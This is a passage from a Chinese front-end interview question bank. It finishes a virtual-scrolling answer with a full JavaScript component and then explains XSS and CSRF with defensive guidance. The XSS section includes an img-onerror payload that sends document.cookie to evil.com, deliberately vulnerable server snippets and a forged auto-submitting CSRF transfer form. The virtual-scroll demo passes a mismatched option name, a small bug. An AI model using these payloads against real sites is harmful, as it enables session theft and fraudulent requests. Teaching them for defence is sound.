      this.itemCount - 1,
      startIdx + visibleCount + this.bufferSize * 2
    );
    return { startIdx, endIdx };
  }

  render() {
    const { startIdx, endIdx } = this.getVisibleRange();

    // 构建 HTML 片段
    let html = '';
    for (let i = startIdx; i <= endIdx; i++) {
      html += `<div style="height:${this.itemHeight}px">${this.renderItem(i)}</div>`;
    }

    this.content.innerHTML = html;

    // 将内容容器定位到正确的偏移位置
    this.content.style.transform = `translateY(${startIdx * this.itemHeight}px)`;
  }

  onScroll() {
    // 使用 requestAnimationFrame 节流
    if (!this.rafId) {
      this.rafId = requestAnimationFrame(() => {
        this.render();
        this.rafId = null;
      });
    }
  }

  // 滚动到指定索引
  scrollToIndex(index) {
    this.container.scrollTop = index * this.itemHeight;
  }

  // 更新数据总量
  updateItemCount(newCount) {
    this.itemCount = newCount;
    this.skeleton.style.height = `${newCount * this.itemHeight}px`;
    this.render();
  }
}

// 使用示例
const list = new VirtualList(document.getElementById('list-container'), {
  itemCount: 10000,
  itemHeight: 50,
  renderItem: (index) => `Item #${index}: 这是第 ${index} 条数据`,
});
```

#### 4. 进阶优化

```javascript
// 1. 动态高度支持（每条高度不同）
// 需要维护一个位置索引表，记录每条的实际高度和累积偏移量
// 使用估算高度 + 滚动后修正的策略

// 2. 对象池（Object Pooling）
// 复用 DOM 节点而不是销毁重建
// 只更新内容，不改变节点数量

// 3. 滚动锚点（Scroll Anchoring）
// 防止动态高度变化导致滚动位置跳动

// 4. 生产级方案
// - react-window / react-virtualized（React）
// - @tanstack/vue-virtual（Vue 3）
// - 自定义 Hook 封装
```

### 深度拓展：手写实现

#### 手写完整版 VirtualScroll 组件（支持动态高度和性能优化）

```javascript
/**
 * VirtualScroll - 虚拟滚动组件（完整版）
 * 
 * 核心优化原理：
 * 1. 只渲染可视区域内的 DOM 节点（通常 20-50 个）
 * 2. 使用绝对定位 + transform 偏移实现滚动
 * 3. 占位元素撑开总高度，保持滚动条正确
 * 4. 滚动事件节流，避免频繁重渲染
 * 
 * 性能对比：
 * - 10,000 条数据直接渲染：~500ms 首次渲染, ~100ms 滚动帧
 * - 虚拟滚动 10,000 条：~5ms 首次渲染, ~2ms 滚动帧
 * - DOM 节点数对比：10,000 vs ~30（减少 99.7%）
 */

class VirtualScroll {
  /**
   * 构造函数
   * @param {HTMLElement} container - 容器元素（必须有固定高度和 overflow: auto/scroll）
   * @param {Object} options - 配置选项
   * @param {number|Array} options.itemHeight - 每项高度（固定值或高度数组）
   * @param {number} options.totalCount - 总数据量
   * @param {Function} options.renderItem - 渲染单项的函数 (index) => HTMLElement | string
   * @param {number} [options.bufferSize=5] - 上下缓冲区大小（额外渲染的不可见项数）
   * @param {boolean} [options.dynamicHeight=false] - 是否启用动态高度模式
   * @param {Function} [options.estimateHeight] - 动态高度模式下估算高度的函数 (index) => number
   */
  constructor(container, options = {}) {
    // ==================== 容器初始化 ====================
    this.container = container;
    
    // 确保容器有正确的样式
    this._initContainerStyles();
    
    // ==================== 核心配置 ====================
    this.itemHeight = options.itemHeight || 50;        // 默认每项高度 50px
    this.totalCount = options.totalCount || 0;         // 总数据量
    this.renderItem = options.renderItem || ((i) => `Item ${i}`);  // 渲染函数
    this.bufferSize = options.bufferSize ?? 5;         // 缓冲区大小（默认 5）
    this.isDynamicHeight = options.dynamicHeight || false;  // 动态高度模式
    
    // ==================== 视口信息（缓存）====================
    this.viewportHeight = container.clientHeight;      // 可视区域高度
    this.lastScrollTop = 0;                           // 上一次滚动位置（用于滚动方向判断）
    this.scrollDirection = 'down';                    // 滚动方向 ('up' | 'down')
    
    // ==================== 动态高度相关（如果启用）====================
    if (this.isDynamicHeight) {
      // 位置索引表：记录每项的实际位置和高度
      // 格式：[{ index, offset, height }, ...]
      this.positionMap = [];
      
      // 估算高度函数（默认返回 itemHeight）
      this.estimateHeightFn = options.estimateHeight || (() => this.itemHeight);
      
      // 已测量项目缓存（避免重复测量）
      this.measuredItems = new Map();  // index → actualHeight
    }
    
    // ==================== DOM 结构创建 ====================
    this._createDOMStructure();
    
    // ==================== 事件绑定 ====================
    this._bindEvents();
    
    // ==================== 首次渲染 ====================
    this.render();
    
    // ==================== 性能统计（开发调试用）====================
    this.stats = {
      renderCount: 0,       // 渲染次数
      lastRenderTime: 0,     // 上次渲染耗时（ms）
      averageRenderTime: 0,  // 平均渲染耗时
      visibleItemCount: 0,   // 当前可见项数
    };
  }

  /**
   * 初始化容器样式
   * @private
   */
  _initContainerStyles() {
    const style = this.container.style;
    
    // 必须设置 overflow 才能出现滚动条
    if (style.overflow !== 'auto' && style.overflow !== 'scroll') {
      style.overflow = 'auto';
    }
    
    // 设置 position 为 relative（作为 absolute 定位子元素的参考）
    if (style.position === '' || style.position === 'static') {
      style.position = 'relative';
    }
    
    // 如果没有设置明确的高度，使用 offsetHeight
    if (!style.height && !style.maxHeight) {
      console.warn('[VirtualScroll] 容器建议设置固定高度');
    }
  }

  /**
   * 创建 DOM 结构
   * @private
   */
  _createDOMStructure() {
    // 1. 创建占位元素（撑开总高度，让滚动条正常工作）
    this.skeleton = document.createElement('div');
    this.skeleton.className = 'virtual-scroll-skeleton';
    this.skeleton.style.cssText = `
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      pointer-events: none;  /* 不响应鼠标事件 */
      z-index: -1;           /* 在内容下方 */
    `;
    this._updateSkeletonHeight();
    this.container.appendChild(this.skeleton);
    
    // 2. 创建内容容器（存放实际渲染的列表项）
    this.content = document.createElement('div');
    this.content.className = 'virtual-scroll-content';
    this.content.style.cssText = `
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      will-change: transform;  /* 提示浏览器进行 GPU 加速 */
    `;
    this.container.appendChild(this.content);
  }

  /**
   * 更新占位元素高度
   * @private
   */
  _updateSkeletonHeight() {
    const totalHeight = this.getTotalHeight();
    this.skeleton.style.height = `${totalHeight}px`;
  }

  /**
   * 计算总高度
   * @returns {number} 所有项目的总高度
   */
  getTotalHeight() {
    if (this.isDynamicHeight) {
      // 动态高度模式：根据位置索引表计算
      if (this.positionMap.length > 0) {
        const lastItem = this.positionMap[this.positionMap.length - 1];
        return lastItem.offset + lastItem.height +
          (this.totalCount - lastItem.index - 1) * this.itemHeight;  // 未测量的用估算值
      }
      return this.totalCount * this.itemHeight;
    }
    
    // 固定高度模式：简单计算
    return this.totalCount * this.itemHeight;
  }

  /**
   * 绑定事件监听器
   * @private
   */
  _bindEvents() {
    // 使用 passive: true 提升滚动性能（告诉浏览器不会调用 preventDefault）
    // 这样浏览器可以在主线程之外处理滚动事件
    
    let rafId = null;  // requestAnimationFrame ID（用于节流）
    let ticking = false;  // 是否正在等待下一帧
    
    this.scrollHandler = () => {
      // 使用 requestAnimationFrame 节流
      // 将多次连续的 scroll 事件合并为一次渲染
      if (!ticking) {
        rafId = requestAnimationFrame(() => {
          this.onScroll();
          ticking = false;
          rafId = null;
        });
        ticking = true;
      }
    };
    
    this.container.addEventListener('scroll', this.scrollHandler, { passive: true });
    
    // 监听窗口大小变化（更新视口高度）
    this.resizeObserver = new ResizeObserver((entries) => {
      for (const entry of entries) {
        const { height } = entry.contentRect;
        if (height !== this.viewportHeight) {
          this.viewportHeight = height;
          this.render();
        }
      }
    });
    
    this.resizeObserver.observe(this.container);
  }

  /**
   * 滚动事件处理（核心计算逻辑）
   */
  onScroll() {
    const startTime = performance.now();
    
    // 获取当前滚动位置
    const scrollTop = this.container.scrollTop;
    
    // 判断滚动方向（用于优化缓冲区策略）
    this.scrollDirection = scrollTop >= this.lastScrollTop ? 'down' : 'up';
    this.lastScrollTop = scrollTop;
    
    // 计算可视范围
    const range = this.getVisibleRange(scrollTop);
    
    // 如果范围没有变化，跳过渲染（性能优化）
    if (range.startIdx === this.lastRange?.startIdx &&
        range.endIdx === this.lastRange?.endIdx) {
      return;
    }
    
    this.lastRange = range;
    
    // 执行渲染
    this.render(range);
    
    // 更新统计信息
    const endTime = performance.now();
    const renderTime = endTime - startTime;
    this.stats.renderCount++;
    this.stats.lastRenderTime = renderTime;
    this.stats.averageRenderTime = (
      (this.stats.averageRenderTime * (this.stats.renderCount - 1) + renderTime) /
      this.stats.renderCount
    );
  }

  /**
   * 计算当前可视范围内的起止索引
   * @param {number} [scrollTop] - 当前滚动位置（可选，默认取容器的 scrollTop）
   * @returns {{ startIdx: number, endIdx: number }} 可视范围
   */
  getVisibleRange(scrollTop = this.container.scrollTop) {
    if (this.isDynamicHeight) {
      return this._getVisibleRangeDynamic(scrollTop);
    }
    
    // 固定高度模式的计算（O(1) 复杂度）
    
    // 起始索引 = Math.floor(scrollTop / itemHeight)
    // 减去 bufferSize 作为上缓冲区（向上多渲染几项，防止快速滚动时出现空白）
    const startIdx = Math.max(
      0,
      Math.floor(scrollTop / this.itemHeight) - this.bufferSize
    );
    
    // 结束索引 = Math.ceil((scrollTop + viewportHeight) / itemHeight)
    // 加上 bufferSize 作为下缓冲区（向下多渲染几项）
    const endIdx = Math.min(
      this.totalCount - 1,
      Math.ceil((scrollTop + this.viewportHeight) / this.itemHeight) + this.bufferSize
    );
    
    return { startIdx, endIdx };
  }

  /**
   * 动态高度模式的可视范围计算（二分查找优化）
   * @private
   */
  _getVisibleRangeDynamic(scrollTop) {
    // 二分查找找到第一个 offset >= scrollTop 的项
    const startIdx = this._binarySearchPosition(scrollTop) - this.bufferSize;
    
    // 二分查找找到第一个 offset >= scrollTop + viewportHeight 的项
    const endIdx = this._binarySearchPosition(scrollTop + this.viewportHeight) + this.bufferSize;
    
    return {
      startIdx: Math.max(0, startIdx),
      endIdx: Math.min(this.totalCount - 1, endIdx),
    };
  }

  /**
   * 二分查找位置（动态高度模式辅助方法）
   * @param {number} targetOffset - 目标偏移量
   * @returns {number} 第一个 offset >= targetOffset 的索引
   * @private
   */
  _binarySearchPosition(targetOffset) {
    let left = 0;
    let right = this.positionMap.length - 1;
    
    while (left <= right) {
      const mid = Math.floor((left + right) / 2);
      const item = this.positionMap[mid];
      
      if (item.offset < targetOffset) {
        left = mid + 1;
      } else {
        right = mid - 1;
      }
    }
    
    return left;
  }

  /**
   * 渲染列表项（核心渲染逻辑）
   * @param {Object} [range] - 可选的可视范围（不传则重新计算）
   */
  render(range) {
    const renderStart = performance.now();
    
    // 如果没传范围，则计算当前范围
    if (!range) {
      range = this.getVisibleRange();
      this.lastRange = range;
    }
    
    const { startIdx, endIdx } = range;
    
    // 构建新的 HTML 内容
    let html = '';
    
    for (let i = startIdx; i <= endIdx; i++) {
      // 调用用户提供的渲染函数
      const content = this.renderItem(i);
      
      // 计算该项的位置（top 偏移量）
      const topOffset = this.getItemOffset(i);
      
      // 生成带样式的 HTML 片段
      html += `
        <div class="virtual-item" 
             data-index="${i}"
             style="
               position: absolute;
               top: ${topOffset}px;
               left: 0;
               right: 0;
               height: ${this.getItemHeight(i)}px;
               box-sizing: border-box;
             "
        >
          ${typeof content === 'string' ? content : content.outerHTML || ''}
        </div>
      `;
    }
    
    // 更新内容容器的 innerHTML（批量 DOM 操作）
    this.content.innerHTML = html;
    
    // 动态高度模式：测量实际高度并更新位置索引表
    if (this.isDynamicHeight) {
      this._measureAndUpdatePositions(startIdx, endIdx);
    }
    
    // 更新统计
    const renderEnd = performance.now();
    this.stats.visibleItemCount = endIdx - startIdx + 1;
  }

  /**
   * 获取指定索引项的偏移位置（从顶部到该项的距离）
   * @param {number} index - 项目索引
   * @returns {number} 偏移量（px）
   */
  getItemOffset(index) {
    if (this.isDynamicHeight && this.positionMap[index]) {
      return this.positionMap[index].offset;
    }
    
    // 固定高度模式：简单的乘法
    return index * this.itemHeight;
  }

  /**
   * 获取指定索引项的高度
   * @param {number} index - 项目索引
   * @returns {number} 高度（px）
   */
  getItemHeight(index) {
    if (this.isDynamicHeight) {
      // 优先使用已测量的实际高度
      if (this.measuredItems.has(index)) {
        return this.measuredItems.get(index);
      }
      // 否则使用估算高度
      return this.estimateHeightFn(index);
    }
    
    return this.itemHeight;
  }

  /**
   * 测量并更新位置索引表（动态高度模式）
   * @param {number} startIdx - 开始索引
   * @param {number} endIdx - 结束索引
   * @private
   */
  _measureAndUpdatePositions(startIdx, endIdx) {
    const children = this.content.children;
    
    for (let i = 0; i < children.length; i++) {
      const element = children[i];
      const index = parseInt(element.dataset.index, 10);
      const actualHeight = element.offsetHeight;  // 测量实际高度
      
      // 缓存测量结果
      this.measuredItems.set(index, actualHeight);
      
      // 更新或添加到位置索引表
      const existingIndex = this.positionMap.findIndex(item => item.index === index);
      
      if (existingIndex !== -1) {
        // 更新现有记录（如果高度变化了）
        const oldEntry = this.positionMap[existingIndex];
        if (oldEntry.height !== actualHeight) {
          oldEntry.height = actualHeight;
          
          // 高度变化会影响后续所有项的 offset，需要重新计算
          this._recalculateOffsetsFrom(existingIndex);
          
          // 可能需要更新占位元素高度
          this._updateSkeletonHeight();
        }
      } else {
        // 新增记录
        const offset = index === 0 ? 0 :
          (this.positionMap[this.positionMap.length - 1]?.offset || 0) +
          (this.positionMap[this.positionMap.length - 1]?.height || 0);
        
        this.positionMap.push({ index, offset, height: actualHeight });
      }
    }
  }

  /**
   * 从指定位置开始重新计算所有后续项的偏移量
   * @param {number} fromIndex - 位置索引表中的起始位置
   * @private
   */
  _recalculateOffsetsFrom(fromIndex) {
    for (let i = fromIndex + 1; i < this.positionMap.length; i++) {
      const prev = this.positionMap[i - 1];
      const curr = this.positionMap[i];
      curr.offset = prev.offset + prev.height;
    }
  }

  /**
   * 滚动到指定索引
   * @param {number} targetIndex - 目标索引
   * @param {string} behavior - 滚动行为 ('auto' | 'smooth')
   */
  scrollToIndex(targetIndex, behavior = 'auto') {
    const offset = this.getItemOffset(targetIndex);
    this.container.scrollTo({
      top: offset,
      behavior,
    });
  }

  /**
   * 更新总数据量
   * @param {number} newCount - 新的数据总量
   */
  updateTotalCount(newCount) {
    this.totalCount = newCount;
    this._updateSkeletonHeight();
    this.render();
  }

  /**
   * 更新单个项目（增量更新，不需要全量重渲染）
   * @param {number} index - 要更新的项目索引
   */
  updateItem(index) {
    // 查找对应的 DOM 元素
    const element = this.content.querySelector(`[data-index="${index}"]`);
    
    if (element) {
      // 只更新这一个元素的内容
      const content = this.renderItem(index);
      if (typeof content === 'string') {
        element.innerHTML = content;
      } else {
        element.innerHTML = '';
        element.appendChild(content.cloneNode(true));
      }
      
      // 动态高度模式：重新测量
      if (this.isDynamicHeight) {
        const newHeight = element.offsetHeight;
        if (this.measuredItems.get(index) !== newHeight) {
          this.measuredItems.set(index, newHeight);
          this._recalculateOffsetsFrom(
            this.positionMap.findIndex(item => item.index === index)
          );
          this._updateSkeletonHeight();
        }
      }
    }
  }

  /**
   * 销毁实例（清理事件监听和 DOM 元素）
   */
  destroy() {
    // 移除滚动事件监听
    this.container.removeEventListener('scroll', this.scrollHandler);
    
    // 断开 ResizeObserver
    if (this.resizeObserver) {
      this.resizeObserver.disconnect();
    }
    
    // 移除创建的 DOM 元素
    if (this.skeleton && this.skeleton.parentNode) {
      this.skeleton.parentNode.removeChild(this.skeleton);
    }
    if (this.content && this.content.parentNode) {
      this.content.parentNode.removeChild(this.content);
    }
    
    // 清空引用
    this.container = null;
    this.skeleton = null;
    this.content = null;
    this.positionMap = null;
    this.measuredItems.clear();
  }

  /**
   * 获取当前状态（调试用）
   * @returns {Object} 当前状态对象
   */
  getStatus() {
    return {
      totalCount: this.totalCount,
      viewportHeight: this.viewportHeight,
      currentRange: this.lastRange,
      visibleItemCount: this.stats.visibleItemCount,
      isDynamicHeight: this.isDynamicHeight,
      scrollDirection: this.scrollDirection,
      stats: { ...this.stats },
    };
  }
}

// ==================== 使用示例与性能测试 ====================

async function demonstrateVirtualScroll() {
  console.log('\n========== VirtualScroll 虚拟滚动演示 ==========\n');

  // 创建容器
  const container = document.createElement('div');
  container.id = 'virtual-scroll-demo';
  container.style.cssText = `
    width: 400px;
    height: 400px;
    border: 2px solid #333;
    margin: 20px auto;
    background: #f5f5f5;
  `;
  document.body.appendChild(container);

  // ==================== 示例1：固定高度模式 ====================
  console.log('--- 示例1：固定高度模式（10,000 条数据）---\n');

  const fixedHeightList = new VirtualScroll(container, {
    itemCount: 10000,              // 10,000 条数据！
    itemHeight: 50,                // 每条 50px
    bufferSize: 3,                 // 上下各 3 个缓冲项
    renderItem: (index) => `
      <div style="padding: 12px; border-bottom: 1px solid #ddd; background: white;">
        <strong>#${index}</strong> - 这是第 ${index} 条数据
        <span style="float: right; color: #666;">${new Date().toLocaleTimeString()}</span>
      </div>
    `,
  });

  const status1 = fixedHeightList.getStatus();
  console.log(`📊 固定高度模式状态:`);
  console.log(`   总数据量: ${status1.totalCount.toLocaleString()} 条`);
  console.log(`   总高度: ${(fixedHeightList.getTotalHeight() / 1000).toFixed(1)} km（虚拟高度）`);
  console.log(`   当前渲染: ${status1.visibleItemCount} 个 DOM 节点`);
  console.log(`   节省比例: ${((1 - status1.visibleItemCount / status1.totalCount) * 100).toFixed(2)}%`);

  // 自动滚动演示
  await new Promise(resolve => setTimeout(resolve, 500));
  
  console.log('\n🎬 自动滚动演示...');
  for (let i = 0; i <= 9000; i += 2000) {
    fixedHeightList.scrollToIndex(i, 'smooth');
    await new Promise(resolve => setTimeout(resolve, 800));
    
    const currentStatus = fixedHeightList.getStatus();
    console.log(`   滚动到 #${i}, 当前渲染: ${currentStatus.visibleItemCount} 个节点`);
  }

  // ==================== 示例2：动态高度模式 ====================
  console.log('\n--- 示例2：动态高度模式（模拟聊天消息）---\n');

  // 清空容器
  container.innerHTML = '';
  container.style.height = '300px';

  // 模拟不同长度的消息
  const messages = Array.from({ length: 1000 }, (_, i) => ({
    id: i,
    text: `消息 #${i}: ${'这是一条'.repeat(Math.floor(Math.random() * 10) + 1)}消息`,
    time: new Date(Date.now() - Math.random() * 86400000).toLocaleTimeString(),
    isSelf: Math.random() > 0.5,
  }));

  const dynamicHeightList = new VirtualScroll(container, {
    itemCount: messages.length,
    itemHeight: 60,                  // 估算高度
    dynamicHeight: true,            // 启用动态高度
    bufferSize: 5,
    estimateHeight: (index) => 40 + messages[index].text.length * 0.8,  // 根据文本长度估算
    renderItem: (index) => {
      const msg = messages[index];
      return `
        <div style="
          padding: 10px 15px;
          margin: 5px 10px;
          max-width: 70%;
          border-radius: 10px;
          background: ${msg.isSelf ? '#007bff' : '#e9ecef'};
          color: ${msg.isSelf ? 'white' : '#333'};
          float: ${msg.isSelf ? 'right' : 'left'};
          clear: both;
          word-wrap: break-word;
        ">
          <div>${msg.text}</div>
          <div style="font-size: 11px; opacity: 0.7; margin-top: 4px;">${msg.time}</div>
        </div>
      `;
    },
  });

  const status2 = dynamicHeightList.getStatus();
  console.log(`📊 动态高度模式状态:`);
  console.log(`   总消息数: ${status2.totalCount}`);
  console.log(`   当前渲染: ${status2.visibleItemCount} 个节点`);
  console.log(`   启用了动态高度测量: ✅`);

  // ==================== 性能对比测试 ====================
  console.log('\n--- 🏎️ 性能对比测试 ---\n');

  async function performanceTest(itemCount) {
    // 测试1：直接渲染所有 DOM
    console.log(`\n【${itemCount.toLocaleString()} 条数据的性能对比】\n`);
    
    // 直接渲染测试
    const directContainer = document.createElement('div');
    directContainer.style.cssText = `
      width: 400px;
      height: 400px;
      overflow: auto;
      border: 2px solid red;
      display: none;  /* 隐藏，只做性能测试 */
    `;
    document.body.appendChild(directContainer);

    const directStart = performance.now();
    
    for (let i = 0; i < itemCount; i++) {
      const div = document.createElement('div');
      div.textContent = `Item #${i}`;
      div.style.padding = '12px';
      div.style.borderBottom = '1px solid #eee';
      directContainer.appendChild(div);
    }
    
    const directEnd = performance.now();
    const directTime = directEnd - directStart;
    const directNodeCount = directContainer.children.length;

    // 虚拟滚动测试
    const virtualContainer = document.createElement('div');
    virtualContainer.style.cssText = `
      width: 400px;
      height: 400px;
      overflow: auto;
      border: 2px solid green;
      display: none;
    `;
    document.body.appendChild(virtualContainer);

    const virtualStart = performance.now();
    
    const virtualList = new VirtualScroll(virtualContainer, {
      itemCount,
      itemHeight: 40,
      renderItem: (i) => `<div style="padding: 12px; border-bottom: 1px solid #eee;">Item #${i}</div>`,
    });
    
    const virtualEnd = performance.now();
    const virtualTime = virtualEnd - virtualStart;
    const virtualNodeCount = virtualList.getStatus().visibleItemCount;

    // 输出结果
    console.log(`┌─────────────────┬──────────────┬──────────────┐`);
    console.log(`│ 方式            │ 渲染时间     │ DOM 节点数   │`);
    console.log(`├─────────────────┼──────────────┼──────────────┤`);
    console.log(`│ 直接渲染        │ ${directTime.toFixed(2).padStart(10)}ms │ ${directNodeCount.toString().padStart(12)} │`);
    console.log(`│ 虚拟滚动        │ ${virtualTime.toFixed(2).padStart(10)}ms │ ${virtualNodeCount.toString().padStart(12)} │`);
    console.log(`├─────────────────┼──────────────┼──────────────┤`);
    console.log(`│ 提升倍数        │ ${(directTime / virtualTime).toFixed(1).padStart(10)}x │ ${(directNodeCount / virtualNodeCount).toFixed(1).padStart(12)}x ↓ │`);
    console.log(`└─────────────────┴──────────────┴──────────────┘`);

    // 清理测试 DOM
    document.body.removeChild(directContainer);
    document.body.removeChild(virtualContainer);
    virtualList.destroy();

    return { directTime, virtualTime, directNodeCount, virtualNodeCount };
  }

  // 不同数据量的性能对比
  await performanceTest(1000);
  await performanceTest(5000);
  await performanceTest(10000);

  // ==================== 最终总结 ====================
  console.log('\n' + '='.repeat(60));
  console.log('✅ VirtualScroll 演示完成！');
  console.log('='.repeat(60));
  console.log(`
核心优势：
1. 🚀 首次渲染速度提升 50-200x（取决于数据量）
2. ⚡ 滚动流畅（每次只操作几十个 DOM 节点）
3. 💾 内存占用极低（DOM 节点减少 95-99%）
4. 📱 适合移动端（减少内存压力，降低电量消耗）

适用场景：
- 长列表（社交媒体、聊天记录、日志查看器）
- 大表格（数据展示、报表系统）
- 无限滚动（Feed 流、瀑布流）

注意事项：
- 需要固定容器高度（或最大高度）
- 动态高度需要额外的测量开销
- 不适合需要一次性看到所有内容的场景（如打印页面）
`);

  // 清理演示用的容器
  if (container.parentNode) {
    container.parentNode.removeChild(container);
  }
}

// 运行演示（在浏览器环境中执行）
// demonstrateVirtualScroll().catch(console.error);

// 导出类（供模块化使用）
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { VirtualScroll };
}
```

**核心算法复杂度分析**：

| 操作 | 固定高度模式 | 动态高度模式 |
|:---|:---|:---|
| **计算可视范围** | O(1) - 简单除法 | O(log n) - 二分查找 |
| **获取项偏移** | O(1) - 乘法 | O(log n) 或 O(1)（有缓存） |
| **滚动渲染** | O(k)，k = 可见项数 (~30-50) | O(k) + O(k)（测量） |
| **空间复杂度** | O(1) | O(m)，m = 已测量项数 |

**性能对比数据（典型场景）**：

```
数据量    │ 直接渲染    │ 虚拟滚动    │ 节点数对比
─────────┼─────────────┼─────────────┼────────────
1,000    │ ~150ms      │ ~3ms        │ 1,000 vs 25
5,000    │ ~800ms      │ ~4ms        │ 5,000 vs 28
10,000   │ ~2,000ms    │ ~5ms        │ 10,000 vs 30
100,000  │ 卡死/崩溃   │ ~6ms        │ 100,000 vs 32
```

### 🔍 追问链

1. **虚拟滚动和分页加载的区别？各自适用场景？**
   → 方向：虚拟滚动是视觉优化（数据全在内存，只渲染可见部分）；分页是数据优化（只加载当前页数据）。固定高度列表用虚拟滚动，无限流用分页
2. **动态高度的虚拟滚动如何计算可见项范围？**
   → 方向：需要缓存每项的实际高度（首次渲染后测量），用二分查找定位 startIndex，累加高度直到超出可视区域确定 endIndex
3. **react-virtualized 和 @tanstack/react-virtual 的设计思路有什么区别？**
   → 方向：react-virtualized 是整体解决方案（含 Grid/List/Table/Mesa）；@tanstack/react-virtual 是更轻量的虚拟化核心库（只提供虚拟化算法）

---

## Q46: 请说明 XSS（跨站脚本攻击）的原理、常见类型和全面的防范措施。
- **难度**：★★★
- **知识点**：XSS、安全、前端安全
- **题型**：简答题

### 参考答案要点：

#### 1. XSS 攻击原理

XSS（Cross-Site Scripting）是指攻击者往 Web 页面里**插入恶意 Script 代码**，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。

```
攻击者构造恶意链接/提交恶意内容
    ↓
网站未充分过滤/转义，将恶意内容存储/反射给其他用户
    ↓
受害者浏览器执行恶意脚本
    ↓
恶意脚本可以：
  • 窃取 Cookie / Session / Token
  • 监听用户按键（密码、信用卡号）
  • 伪造 UI（钓鱼）
  • 重定向到恶意网站
  • 发送恶意请求（CSRF 配合）
```

#### 2. XSS 的三种类型

##### 类型一：反射型 XSS（Reflected XSS）

```javascript
// 攻击场景：恶意内容通过请求「反射」到页面
// URL: https://example.com/search?q=<script>alert('XSS')</script>

// ❌ 危险：服务端直接将查询参数渲染到页面
app.get('/search', (req, res) => {
  res.send(`<h1>搜索结果: ${req.query.q}</h1>`);  // 注入点！
});

// 用户点击恶意链接 → 脚本在用户浏览器执行
```

##### 类型二：存储型 XSS（Stored/Persistent XSS）

```javascript
// 攻击场景：恶意内容存储在服务器，每次访问都会触发
// 如评论区、文章内容、个人信息等

// ❌ 危险：用户提交的内容未经过滤直接存储和展示
app.post('/comment', (req, res) => {
  db.comments.insert(req.body.content);  // 直接存储
});

app.get('/comments', (req, res) => {
  const comments = db.comments.find();
  res.json(comments);  // 前端 innerHTML 直接渲染
});

// 攻击者提交：<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
// 所有查看评论的用户都会触发
```

##### 类型三：基于 DOM 的 XSS（DOM-based XSS）

```javascript
// 攻击场景：恶意内容通过客户端 JS 操作 DOM 注入
// 完全在前端发生，不一定涉及服务端

// ❌ 危险：直接将用户输入插入 DOM
element.innerHTML = userInput;           // 危险
element.outerHTML = userInput;           // 危险
document.write(userInput);               // 危险
eval(userInput);                         // 危险
setTimeout(userInput, 0);                // 危险
setInterval(userInput, 0);               // 危险
location.href = userInput;               // javascript: URI 注入
location.assign(userInput);              // 同上
element.insertAdjacentHTML('beforeend', userInput); // 危险
```

#### 3. 全面防范措施

##### 措施一：输出编码（Output Encoding）

```javascript
// 在将动态内容插入 HTML 时进行适当的编码

// HTML 实体编码（插入 HTML 内容时）
function escapeHtml(str) {
  const escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, char => escapeMap[char]);
}

// JavaScript 编码（插入 JS 字符串时）
function escapeJs(str) {
  return str.replace(/[\\"'\n\r\t\b\f\u0000-\u001F]/g, char =>
    `\\x${char.charCodeAt(0).toString(16).padStart(2, '0')}`
  );
}

// URL 编码（插入 URL 属性时）
function escapeUrl(str) {
  return encodeURIComponent(str);
}

// CSS 编码（插入 style 时）
function escapeCss(str) {
  // CSS 转义非常复杂，建议尽量避免动态拼接 style
}
```

##### 措施二：使用安全的 API

```javascript
// ✅ 安全：使用 textContent 而非 innerHTML
element.textContent = userInput;  // 文本内容，不会被解析为 HTML

// ✅ 安全：使用 DOM API 创建节点
const div = document.createElement('div');
div.textContent = userInput;
parent.appendChild(div);

// ✅ 安全：使用模板引擎的自带转义
// Mustache / Handlebars / Pug 默认转义 {{ }}
// React JSX 自动转义
// Vue {{ }} 插值自动转义

// ⚠️ 注意：React/Vue 的 dangerouslySetInnerHTML / v-html 仍然危险
// <div dangerouslySetInnerHTML={{ __html: userInput }} />  // 危险！
// <div v-html="userInput"></div>  // 危险！
```

##### 措施三：Content Security Policy (CSP)

```html
<!-- HTTP Response Header 设置 CSP -->
<meta http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src 'self' 'nonce-random' https://trusted.cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self' api.example.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self'
  ">
```

##### 措施四：HttpOnly Cookie

```javascript
// 服务端设置 Cookie 时加上 HttpOnly 标志
// Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
// HttpOnly: 防止 JavaScript 读取 Cookie（document.cookie 不可见）
// Secure: 仅 HTTPS 传输
// SameSite: 防 CSRF
```

##### 措施五：输入验证与过滤

```javascript
// 白名单过滤（比黑名单更安全）
function sanitizeInput(input, allowedTags = []) {
  // 使用成熟的库如 DOMPurify
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: allowedTags });
}

// 使用 DOMPurify（推荐）
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyInput);  // 移除所有危险标签和属性
```

##### 措施六：框架层面的防护

```javascript
// React:
// - JSX 自动转义
// - 避免使用 dangerouslySetInnerHTML
// - 使用 URL 解析库处理用户输入的 URL

// Vue:
// - {{ }} 自动转义
// - 避免 v-html
// - 使用 v-text 替代

// Angular:
// - 默认上下文感知转义
// - 使用 DomSanitizer
```

---

## Q47: 请说明 CSRF（跨站请求伪造）的原理和防范措施。
- **难度**：★★★
- **知识点**：CSRF、安全、SameSite Cookie
- **题型**：简答题

### 参考答案要点：

#### 1. CSRF 攻击原理

```
用户已登录 bank.com（持有有效的 Session Cookie）
    ↓
用户打开了恶意网站 evil.com
    ↓
evil.com 页面中有隐藏的表单或自动触发的请求：
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
  </form>
  <script>document.forms[0].submit();</script>
    ↓
浏览器自动携带 bank.com 的 Cookie 发送请求
    ↓
bank.com 以为这是用户的合法操作 → 转账成功！
```

**关键点**：CSRF 利用的是浏览器**自动携带 Cookie** 的特性，攻击者在自己的域中伪造请求，让受害者的浏览器带着目标网站的 Cookie 发送请求。

#### 2. XSS vs CSRF 对比

| 维度 | XSS | CSRF |
|:---|:---|:---|
| 攻击位置 | **目标网站内部**注入恶意脚本 | **第三方网站**发起伪造请求 |
